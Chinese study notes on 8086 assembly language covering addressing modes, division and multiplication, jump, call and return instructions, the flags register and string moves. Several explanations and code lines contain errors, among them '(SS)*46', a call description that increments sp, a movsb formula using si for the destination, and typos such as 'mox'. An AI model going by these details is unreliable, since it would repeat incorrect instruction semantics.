[bx+si]（格式）</p><p>偏移地址    (bx)+(si)</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,[<span class="hljs-built_in">bx</span>+<span class="hljs-built_in">si</span>]<br>mox <span class="hljs-built_in">ax</span>,[<span class="hljs-built_in">bx</span>][<span class="hljs-built_in">si</span>]<br></code></pre></td></tr></table></figure><p>[bx+si+idata]    与    [bx+di+idata]</p><p>使用两个变量与一个常量表示地址</p><p>格式</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,[<span class="hljs-built_in">bx</span>+<span class="hljs-built_in">si</span>+<span class="hljs-number">10</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,[<span class="hljs-built_in">bx</span>][<span class="hljs-built_in">si</span>].<span class="hljs-number">10</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,[<span class="hljs-built_in">bx</span>].<span class="hljs-number">10</span>[<span class="hljs-built_in">si</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">10</span>[<span class="hljs-built_in">bx</span>][<span class="hljs-built_in">si</span>]<br></code></pre></td></tr></table></figure><h1 id="8-数据处理基本问题"><a href="#8-数据处理基本问题" class="headerlink" title="8.数据处理基本问题"></a>8.数据处理基本问题</h1><p>寄存器（reg）</p><p>段寄存器（sreg）</p><h2 id="两个基本的问题"><a href="#两个基本的问题" class="headerlink" title="两个基本的问题"></a>两个基本的问题</h2><p>数据的地址</p><p>数据的长度</p><h2 id="bx，si，di，bp"><a href="#bx，si，di，bp" class="headerlink" title="bx，si，di，bp"></a>bx，si，di，bp</h2><p>在8086中，只有这四个寄存器可以在    []    中进行寻址</p><p>当    []    中出现    bp    ，且没有直接给出段地址，则段地址默认在    ss    中</p><h2 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h2><h3 id="处理的指令"><a href="#处理的指令" class="headerlink" title="处理的指令"></a>处理的指令</h3><p>读取，写入，运算</p><h3 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h3><p>CPU内部，内存，端口</p><h3 id="位置的表达"><a href="#位置的表达" class="headerlink" title="位置的表达"></a>位置的表达</h3><p>立即数（idata）    ：直接的数据</p><p>寄存器    ：数据在寄存器中，使用寄存器名</p><p>段地址(SA)与偏移地址(EA)    ：以    [X]    格式给出地址</p><h3 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h3><p>直接寻址    //EA=idata；SA=(ds)；</p><p>寄存器间接寻址    //EA=(bx)；SA=(ds)；</p><p>寄存器相对寻址    //EA=(bx)+idata；SA=(ds)；</p><p>基址变址寻址    //EA=(bx)+(si)；SA=(ds)；</p><p>相对基址变址寻址    //EA=(bx)+(si)+idata；SA=(ds)；</p><h3 id="长度"><a href="#长度" class="headerlink" title="长度"></a>长度</h3><p>1</p><p>通过寄存器名指明数据长度</p><p>2</p><p>使用操作符    X ptr    指明内存单元长度</p><p>（    X    可以是    word    或    byte    ）</p><h2 id="div指令"><a href="#div指令" class="headerlink" title="div指令"></a>div指令</h2><p>除法指令</p><p>除数：</p><p>在8086中有两种：8位    与    16位</p><p>在一个寄存器或内存单元中</p><p>被除数：</p><p>在8086中</p><p>当除数是8位，默认在    ax    。</p><p>当除数是16位，在    ax与dx    中；dx存放高位，ax存放低位。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">div</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[<span class="hljs-number">0</span>]<br>//(<span class="hljs-built_in">al</span>)=(<span class="hljs-built_in">ax</span>)/((<span class="hljs-built_in">ds</span>)*<span class="hljs-number">16</span>+<span class="hljs-number">0</span>)的商<br>//(<span class="hljs-number">ah</span>)=(<span class="hljs-built_in">ax</span>)/((<span class="hljs-built_in">ds</span>)*<span class="hljs-number">16</span>+<span class="hljs-number">0</span>)的余数<br></code></pre></td></tr></table></figure><h2 id="伪指令dd"><a href="#伪指令dd" class="headerlink" title="伪指令dd"></a>伪指令dd</h2><p>定义    dward</p><p>double word    （双字）</p><h2 id="操作符dup"><a href="#操作符dup" class="headerlink" title="操作符dup"></a>操作符dup</h2><p>进行数据的重复</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">db</span>(dw,dd)重复次数dup(重复的数据)<br></code></pre></td></tr></table></figure><p>例如</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">db <span class="hljs-number">3</span> dup(<span class="hljs-number">0</span>)<span class="hljs-regexp">//</span>定义<span class="hljs-number">3</span>个字节，值全为<span class="hljs-number">0</span><br>db <span class="hljs-number">3</span> dup(<span class="hljs-string">&#x27;abc&#x27;</span>,<span class="hljs-string">&#x27;ABC&#x27;</span>)<span class="hljs-regexp">//</span>定义<span class="hljs-number">18</span>个字节，为<span class="hljs-string">&#x27;abcABCabcABCabcABC&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="9-指令转移原理"><a href="#9-指令转移原理" class="headerlink" title="9.指令转移原理"></a>9.指令转移原理</h1><h2 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h2><p>修改    IP    或者同时修改    CS    和    IP    的指令</p><p>短转移：    -128~127</p><p>近转移：    -32768~32767</p><p>方便程序段在内存中的浮动</p><p>当位移超界时，编译器报错</p><h3 id="指令-1"><a href="#指令-1" class="headerlink" title="指令"></a>指令</h3><p>无条件转移指令（例如：jmp    ）</p><p>条件转移指令</p><p>循环指令（例如：loop    ）</p><p>过程</p><p>中断</p><h3 id="段内转移"><a href="#段内转移" class="headerlink" title="段内转移"></a>段内转移</h3><p>​    //只修改    IP</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">jmp</span> <span class="hljs-built_in">ax</span><br></code></pre></td></tr></table></figure><h3 id="段间转移"><a href="#段间转移" class="headerlink" title="段间转移"></a>段间转移</h3><p>​    //同上修改    CS    和    IP</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">jmp</span> <span class="hljs-number">1000</span>:<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="操作符offset"><a href="#操作符offset" class="headerlink" title="操作符offset"></a>操作符offset</h2><p>取得标号的地址</p><p>例如</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:code<br>code <span class="hljs-meta">segment</span><br><span class="hljs-symbol">start:</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,offset start//<span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0</span><br><span class="hljs-symbol">s:</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,offset s//<span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">3</span><br>code ends<br>end start<br></code></pre></td></tr></table></figure><h2 id="jmp"><a href="#jmp" class="headerlink" title="jmp"></a>jmp</h2><h3 id="需要的两种信息："><a href="#需要的两种信息：" class="headerlink" title="需要的两种信息："></a>需要的两种信息：</h3><p>转移的目的地址</p><p>转移的距离</p><h3 id="段内转移-1"><a href="#段内转移-1" class="headerlink" title="段内转移"></a>段内转移</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">jmp</span> short s<br>//short表示是短转移，s是目的地；转移使得<span class="hljs-built_in">CS</span>:<span class="hljs-built_in">IP</span>指向标号出处地址<br></code></pre></td></tr></table></figure><p>机器指令中不包括转移目的地址，而是告诉了cpu要转移的位移</p><h3 id="段间转移-1"><a href="#段间转移-1" class="headerlink" title="段间转移"></a>段间转移</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">jmp</span> <span class="hljs-built_in">far</span> <span class="hljs-built_in">ptr</span> 标号<br></code></pre></td></tr></table></figure><p>ptr指明了标号的段地址与在段中得偏移地址</p><h3 id="地址在寄存器中"><a href="#地址在寄存器中" class="headerlink" title="地址在寄存器中"></a>地址在寄存器中</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">jmp</span> <span class="hljs-number">16</span>位reg<br></code></pre></td></tr></table></figure><p>IP=(16位reg)</p><h3 id="地址在内存中"><a href="#地址在内存中" class="headerlink" title="地址在内存中"></a>地址在内存中</h3><h4 id="段内"><a href="#段内" class="headerlink" title="段内"></a>段内</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">jmp</span> <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> 内存单元地址<br></code></pre></td></tr></table></figure><p>从内存单元（任意格式）开始的一个字存放着偏移地址</p><h4 id="段间"><a href="#段间" class="headerlink" title="段间"></a>段间</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">jmp</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> 内存单元地址<br></code></pre></td></tr></table></figure><p>在内存单元开始的两个字，高地址存放段地址，低地址存放偏移地址</p><p>(CS)=(内存单元地址+2)</p><p>(IP)=(内存单元地址)</p><h2 id="jcxz指令"><a href="#jcxz指令" class="headerlink" title="jcxz指令"></a>jcxz指令</h2><p>有条件转移指令，短转移</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">jcxz 标号<span class="hljs-regexp">//</span>如果(cx)=<span class="hljs-number">0</span>,转移到标号<br></code></pre></td></tr></table></figure><h2 id="loop指令"><a href="#loop指令" class="headerlink" title="loop指令"></a>loop指令</h2><p>短指令</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">loop</span> 标号<br></code></pre></td></tr></table></figure><h1 id="10-ret和retf"><a href="#10-ret和retf" class="headerlink" title="10.ret和retf"></a>10.ret和retf</h1><h2 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h2><p>用法</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">ret</span><br><span class="hljs-keyword">retf</span><br></code></pre></td></tr></table></figure><p>都是转移指令，都可以修改IP，或者同时修改CS和IP</p><p>ret使用栈中数据，修改    IP    的内容，实现近转移</p><p>retf使用栈中数据，修改        CS和IP    的内容，实现远转移</p><h3 id="使用ret"><a href="#使用ret" class="headerlink" title="使用ret"></a>使用ret</h3><p>原理</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">(IP)</span>=<span class="hljs-comment">((SS)</span>*<span class="hljs-number">46</span>+<span class="hljs-comment">(sp)</span>)<br><span class="hljs-comment">(sp)</span>=<span class="hljs-comment">(sp)</span><span class="hljs-number">+2</span><br></code></pre></td></tr></table></figure><p>相当于</p><p>pop IP</p><h3 id="使用retf"><a href="#使用retf" class="headerlink" title="使用retf"></a>使用retf</h3><p>原理</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">(IP)</span>=<span class="hljs-comment">((SS)</span>*<span class="hljs-number">46</span>+<span class="hljs-comment">(sp)</span>)<br><span class="hljs-comment">(sp)</span>=<span class="hljs-comment">(sp)</span><span class="hljs-number">+2</span><br><span class="hljs-comment">(CS)</span>=<span class="hljs-comment">((ss)</span>*<span class="hljs-number">16</span>+<span class="hljs-comment">(sp)</span>)<br><span class="hljs-comment">(sp)</span>=<span class="hljs-comment">(sp)</span><span class="hljs-number">+2</span><br></code></pre></td></tr></table></figure><p>相当于</p><p>pop IP</p><p>pop CS</p><h2 id="call指令"><a href="#call指令" class="headerlink" title="call指令"></a>call指令</h2><h3 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h3><p>只能实现远转移</p><p>当指向时：</p><p>1.将当前的    IP    或    CS和IP压入栈</p><p>2.转移</p><h3 id="位移转移"><a href="#位移转移" class="headerlink" title="位移转移"></a>位移转移</h3><p>使用</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">call</span> 标号<br></code></pre></td></tr></table></figure><p>原理</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">(sp)</span>=<span class="hljs-comment">(sp)</span><span class="hljs-number">+2</span><br><span class="hljs-comment">((ss)</span>*<span class="hljs-number">16</span>+<span class="hljs-comment">(sp)</span>)=<span class="hljs-comment">(IP)</span><br><span class="hljs-comment">(IP)</span>=<span class="hljs-comment">(IP)</span><span class="hljs-number">+16</span><br></code></pre></td></tr></table></figure><p>相当于</p><p>push IP</p><p>jmp near ptr 标号</p><h3 id="目的地址在指令中"><a href="#目的地址在指令中" class="headerlink" title="目的地址在指令中"></a>目的地址在指令中</h3><p>段间转移</p><p>使用</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">call</span> <span class="hljs-built_in">far</span> <span class="hljs-built_in">ptr</span> 标号<br></code></pre></td></tr></table></figure><p>原理</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">(SP)</span>=<span class="hljs-comment">(SP)</span><span class="hljs-number">+2</span><br><span class="hljs-comment">((ss)</span>*<span class="hljs-number">16</span>+<span class="hljs-comment">(sp)</span>)=<span class="hljs-comment">(CS)</span><br><span class="hljs-comment">(sp)</span>=<span class="hljs-comment">(sp)</span><span class="hljs-number">-2</span><br><span class="hljs-comment">((ss)</span>*<span class="hljs-number">16</span>+<span class="hljs-comment">(sp)</span>)=<span class="hljs-comment">(IP)</span><br><br><span class="hljs-comment">(cs)</span>=标号段地址<br><span class="hljs-comment">(IP)</span>=所在段偏移地址<br></code></pre></td></tr></table></figure><p>相当于</p><p>push cs</p><p>push ip</p><p>jmp far ptr 标号</p><h3 id="转移地址在寄存器中"><a href="#转移地址在寄存器中" class="headerlink" title="转移地址在寄存器中"></a>转移地址在寄存器中</h3><p>使用</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">call</span> <span class="hljs-number">16</span>位<span class="hljs-keyword">reg</span><br></code></pre></td></tr></table></figure><p>原理</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">(sp)</span>=<span class="hljs-comment">(sp)</span><span class="hljs-number">-2</span><br><span class="hljs-comment">((ss)</span>*<span class="hljs-number">16</span>+<span class="hljs-comment">(sp)</span>)=<span class="hljs-comment">(IP)</span><br><br><span class="hljs-comment">(IP)</span>=<span class="hljs-comment">(16位reg)</span><br></code></pre></td></tr></table></figure><p>相当于</p><p>push ip</p><p>jmp 16位reg</p><h3 id="转移地址在内存中"><a href="#转移地址在内存中" class="headerlink" title="转移地址在内存中"></a>转移地址在内存中</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>使用</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">call</span> <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> 标号<br></code></pre></td></tr></table></figure><p>相当于</p><p>push ip</p><p>jmp word ptr 标号</p><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>使用</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> 标号<br></code></pre></td></tr></table></figure><p>相当于</p><p>push cs</p><p>push ip</p><p>jmp dword ptr 标号</p><h2 id="call与ret配合"><a href="#call与ret配合" class="headerlink" title="call与ret配合"></a>call与ret配合</h2><p>写一个有一定功能的程序段（子程序），在需要时，使用call指令执行，由于call指令会将call后面的指令地址存储与栈，在子程序后使用ret指令返回call后的代码继续执行</p><p>框架</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:code<br>cedo <span class="hljs-meta">segment</span><br><span class="hljs-symbol">main:</span><br><span class="hljs-keyword">call</span> <span class="hljs-keyword">sub</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">21h</span><br><span class="hljs-symbol">sub:</span><br><span class="hljs-keyword">call</span> sub1<br><span class="hljs-keyword">ret</span><br><span class="hljs-symbol">sub2:</span><br><span class="hljs-keyword">ret</span><br>code ends<br>end main<br></code></pre></td></tr></table></figure><h2 id="mul指令"><a href="#mul指令" class="headerlink" title="mul指令"></a>mul指令</h2><p>乘法指令</p><p>两个数，位数要相同</p><p>对8位（一个数默认在AL中，另一个在8</p><p>位reg或内存单元中）</p><p>：结果默认在    AX中；</p><p>对16位（一个数默认在AX中，另一个在16</p><p>位reg或内存单元中）</p><p>：结果默认    高位在DX中，低位在AX中</p><h2 id="批量数据传输"><a href="#批量数据传输" class="headerlink" title="批量数据传输"></a>批量数据传输</h2><p>寄存器数量是有限的，</p><p>可以将批量数据存放在内存中，将内存空间的首地址放入寄存器</p><h2 id="寄存器冲突"><a href="#寄存器冲突" class="headerlink" title="寄存器冲突"></a>寄存器冲突</h2><p>问题：子程序使用的寄存器，主程序中也可能用到</p><p>解决：在子程序的开始将所有用到的寄存器中的内容保存，在子程序返回前恢复    可以使用栈来保存寄存器中的内容（入栈，出栈）</p><p>（注意顺序）</p><h1 id="11-标志寄存器"><a href="#11-标志寄存器" class="headerlink" title="11.标志寄存器"></a>11.标志寄存器</h1><h2 id="描述-6"><a href="#描述-6" class="headerlink" title="描述"></a>描述</h2><p>存储相关指令的某些执行结果</p><p>为cpu执行相关指令提供依据</p><p>控制cpu的相关工作方式</p><p>——</p><p>大多数运算指令影响标志寄存器</p><p>大多数传送指令不影响标志寄存器</p><p>——</p><p>在8086cpu中，标志寄存器为16位</p><h2 id="寄存器flag"><a href="#寄存器flag" class="headerlink" title="寄存器flag"></a>寄存器flag</h2><p>按位起作用，每一位都有专门的含义，记录特定信息</p><p>对8086cpu</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">15</span><span class="hljs-number">14</span><span class="hljs-number">13</span><span class="hljs-number">12</span><br><span class="hljs-attribute">11</span>-OF<span class="hljs-number">10</span>-DF<span class="hljs-number">9</span>-IF<span class="hljs-number">8</span>-TF<br><span class="hljs-attribute">7</span>-SF<span class="hljs-number">6</span>-ZF<span class="hljs-number">5</span><span class="hljs-number">4</span>-AF<br><span class="hljs-attribute">3</span><span class="hljs-number">2</span>-PF<span class="hljs-number">1</span><span class="hljs-number">0</span>-CF<br></code></pre></td></tr></table></figure><h3 id="ZF"><a href="#ZF" class="headerlink" title="ZF"></a>ZF</h3><p>零位标志，记录指令执行结果是否为0</p><p>为0：    zf=1</p><p>不为0：    zf=0</p><h3 id="PF"><a href="#PF" class="headerlink" title="PF"></a>PF</h3><p>奇偶标志位，记录指令执行结果所有    bit    位中    1    的个数</p><p>个数为奇：    pf=0</p><p>个数为偶：    pf=1</p><h3 id="SF"><a href="#SF" class="headerlink" title="SF"></a>SF</h3><p>（仅对有符号数有意义）</p><p>符号标志位，记录指令执行结果的正负</p><p>正：    sf=0</p><p>负：    sf=1</p><h3 id="CF"><a href="#CF" class="headerlink" title="CF"></a>CF</h3><p>进位标志位，在进行无符号数运算时，记录运算结果    最高有效位向更高位的进位值（加法）    或    从更高位的借位值（减法）</p><h3 id="OF"><a href="#OF" class="headerlink" title="OF"></a>OF</h3><p>溢出标志位，记录有符号数运算结果是否溢出</p><p>溢出：    of=1</p><p>没溢出：    of=0</p><h3 id="DF"><a href="#DF" class="headerlink" title="DF"></a>DF</h3><p>方向标志位。</p><h2 id="adc指令"><a href="#adc指令" class="headerlink" title="adc指令"></a>adc指令</h2><p>带进位加法指令，利用了    cf</p><p>目的：进行低位相加后的    高位相加在加上低位产生的进位值</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm">例如<br><span class="hljs-keyword">adc</span> a,<span class="hljs-keyword">b</span><br><span class="hljs-comment">//a=a+b+cf</span><br></code></pre></td></tr></table></figure><h2 id="sbb指令"><a href="#sbb指令" class="headerlink" title="sbb指令"></a>sbb指令</h2><p>带进=借位加法指令，利用了    cf</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">例如计算<span class="hljs-number">003e1000h</span>-<span class="hljs-number">00202000h</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">1000h</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">003eh</span><br><span class="hljs-keyword">sub</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">2000h</span><br><span class="hljs-keyword">sbb</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0020h</span><br>//<span class="hljs-built_in">ax</span>=<span class="hljs-built_in">ax</span>-<span class="hljs-number">0020h</span>-cf<br></code></pre></td></tr></table></figure><h2 id="cmp指令"><a href="#cmp指令" class="headerlink" title="cmp指令"></a>cmp指令</h2><p>比较指令，相当于不保存结果的减法指令</p><p>通过影响标志寄存器表示比较结果</p><p>影响： zf, sf, cf, of</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">例如<br>cmp <span class="hljs-selector-tag">a</span>,<span class="hljs-selector-tag">b</span><br>//进行<span class="hljs-selector-tag">a</span>-<span class="hljs-selector-tag">b</span>的运算，不保存结果<br></code></pre></td></tr></table></figure><p>——</p><p>当对无符号数</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>a=b zf=<span class="hljs-number">1</span><br><span class="hljs-regexp">//</span>a&gt;b cf=<span class="hljs-number">0</span> and zf=<span class="hljs-number">0</span><br><span class="hljs-regexp">//</span>a&lt;b cf=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>——</p><p>对有符号数</p><p>当不存在溢出，逻辑结果正负    等于    实际结果正负</p><p>当存在溢出，逻辑结果正负    与    实际结果正负    相反</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">//a&lt;bsf<span class="hljs-operator">=</span><span class="hljs-number">1</span> and of<span class="hljs-operator">=</span><span class="hljs-number">0</span><br>//a&gt;bsf<span class="hljs-operator">=</span><span class="hljs-number">0</span> and of<span class="hljs-operator">=</span><span class="hljs-number">0</span><br><br>//a&lt;bsf<span class="hljs-operator">=</span><span class="hljs-number">0</span> and of<span class="hljs-operator">=</span><span class="hljs-number">1</span><br>//a&gt;bsf<span class="hljs-operator">=</span><span class="hljs-number">1</span> and of<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="检测比较结果的转移指令"><a href="#检测比较结果的转移指令" class="headerlink" title="检测比较结果的转移指令"></a>检测比较结果的转移指令</h2><p>大多数条件转移指令都通过检测标志寄存器的相关标志位的结果，来决定是否修改    ip</p><p>对无符号数：    检测    zf，cf</p><p>对有符号数：    检测    sf，of，zf</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/bj/2023-02-09-221712.3t0v6kpep4y0.webp"></p><h2 id="df标志与串传送指令"><a href="#df标志与串传送指令" class="headerlink" title="df标志与串传送指令"></a>df标志与串传送指令</h2><p>df控制每次操作后    si，di    的递减</p><p>df=0    每次操作后递增</p><p>df=1    每次操作后递减</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">movsb</span><br>先将<span class="hljs-built_in">ds</span>:<span class="hljs-built_in">si</span>指向的内存单元中的字节送入<span class="hljs-built_in">es</span>:<span class="hljs-built_in">di</span><br>后根据df的值，将<span class="hljs-built_in">si</span>与<span class="hljs-built_in">di</span>递增或递减<br>_<br>((<span class="hljs-built_in">es</span>)*<span class="hljs-number">16</span>+(<span class="hljs-built_in">si</span>))=((<span class="hljs-built_in">ds</span>)*<span class="hljs-number">16</span>+(<span class="hljs-built_in">si</span>))<br>如果 df=<span class="hljs-number">0</span><br>(<span class="hljs-built_in">si</span>)=(<span class="hljs-built_in">si</span>)+<span class="hljs-number">1</span><br>(<span class="hljs-built_in">di</span>)=(<span class="hljs-built_in">di</span>)+<span class="hljs-number">1</span><br>如果 df=<span class="hljs-number">1</span><br>(<span class="hljs-built_in">si</span>)=(<span class="hljs-built_in">si</span>)-<span class="hljs-number">1</span><br>(<span class="hljs-built_in">di</span>)=(<span class="hljs-built_in">di</span>)-<span class="hljs-number">1</span><br>_<br><span class="hljs-keyword">movsw</span><br>先将<span class="hljs-built_in">ds</span>:<span class="hljs-built_in">si</span>指向的内存单元中的字节送入<span class="hljs-built_in">es</span>:<span class="hljs-built_in">di</span><br>后根据df的值，将<span class="hljs-built_in">si</span>与<span class="hljs-built_in">di</span>递增<span class="hljs-number">2</span>或递减<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>movsb    与    movsw    都可与    rep    配合使用</p><h2 id="pushf和popf"><a href="#pushf和popf" class="headerlink" title="pushf和popf"></a>pushf和popf</h2><p>pushf</p><p>将标志寄存器的值压栈</p><p>popf</p><p>从栈中弹出数据，送入标志寄存器</p><h2 id="标志寄存器debug"><a href="#标志寄存器debug" class="headerlink" title="标志寄存器debug"></a>标志寄存器debug</h2><p>在    debug    中，标志寄存器按照有意义的各个标志单独表示</p><h1 id="12-内中断"><a href="#12-内中断" class="headerlink" title="12.内中断"></a>12.内中断</h1><h2 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h2><h3 id="描述-7"><a href="#描述-7" class="headerlink" title="描述"></a>描述</h3><p>当cpu执行完当前指令，检测到cpu外部或者内部产生的特殊信息（中断信息），可以立即对信息进行处理。</p><p>中断：cpu不接着向下执行，而是处理特殊信息</p><h3 id="让一段程序为N号中断的处理程序"><a href="#让一段程序为N号中断的处理程序" class="headerlink" title="让一段程序为N号中断的处理程序"></a>让一段程序为N号中断的处理程序</h3><p>将它的入口地址放入中断向量表的N号表项</p><p>即安装程序</p><h2 